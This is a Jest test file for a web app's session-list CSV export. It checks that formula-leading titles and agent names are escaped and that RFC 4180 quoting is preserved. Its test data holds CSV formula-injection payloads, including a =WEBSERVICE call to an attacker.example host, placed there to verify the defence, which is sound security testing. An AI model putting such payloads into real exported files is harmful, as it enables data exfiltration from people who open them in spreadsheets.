import { listSessions } from "@/lib/api/sessions";
import type { Session } from "@/lib/api/types";
import { downloadSessionsCsv } from "@/lib/session-list-export";

jest.mock("@/lib/api/sessions", () => ({
  listSessions: jest.fn(),
}));

const mockListSessions = jest.mocked(listSessions);

function blobText(blob: Blob): Promise<string> {
  return new Promise((resolve, reject) => {
    const reader = new FileReader();
    reader.addEventListener("load", () => resolve(String(reader.result)));
    reader.addEventListener("error", () => reject(reader.error));
    reader.readAsText(blob);
  });
}

function session(title: string): Session {
  return {
    id: "session-1",
    organization_id: "org-1",
    harness_id: "harness-1",
    agent_id: "agent-1",
    owner_principal_id: "principal-1",
    title,
    tags: [],
    model_id: null,
    status: "idle",
    created_at: "2026-08-21T00:00:00Z",
    updated_at: "2026-08-21T00:00:00Z",
    started_at: null,
    finished_at: null,
  };
}

describe("session list CSV export", () => {
  let downloadedBlob: Blob | undefined;

  beforeEach(() => {
    downloadedBlob = undefined;
    mockListSessions.mockReset();
    URL.createObjectURL = jest.fn((blob: Blob) => {
      downloadedBlob = blob;
      return "blob:sessions";
    });
    URL.revokeObjectURL = jest.fn();
    jest.spyOn(HTMLAnchorElement.prototype, "click").mockImplementation(() => {});
  });

  afterEach(() => {
    jest.restoreAllMocks();
  });

  it.each([
    "=SUM(A1:A2)",
    "+cmd",
    "-2+3",
    "@SUM(A1:A2)",
    "\t=SUM(A1:A2)",
    "\r=SUM(A1:A2)",
    "\n=SUM(A1:A2)",
  ])("neutralizes a formula-leading title beginning with %j", async (title) => {
    mockListSessions.mockResolvedValueOnce({
      data: [session(title)],
      total: 1,
      offset: 0,
      limit: 100,
    });

    await downloadSessionsCsv({}, () => "safe agent");

    const csv = await blobText(downloadedBlob!);
    expect(csv).toContain(`'${title}`);
    if (title.startsWith("\r") || title.startsWith("\n")) {
      expect(csv).toContain(`,"'${title}"`);
    }
  });

  it("neutralizes formula-leading agent names and preserves RFC 4180 quoting", async () => {
    mockListSessions.mockResolvedValueOnce({
      data: [session('ordinary, "quoted" title')],
      total: 1,
      offset: 0,
      limit: 100,
    });

    await downloadSessionsCsv({}, () => '=WEBSERVICE("https://attacker.example")');

    const csv = await blobText(downloadedBlob!);
    expect(csv).toContain(`"'=WEBSERVICE(""https://attacker.example"")"`);
    expect(csv).toContain(`"ordinary, ""quoted"" title"`);
  });
});
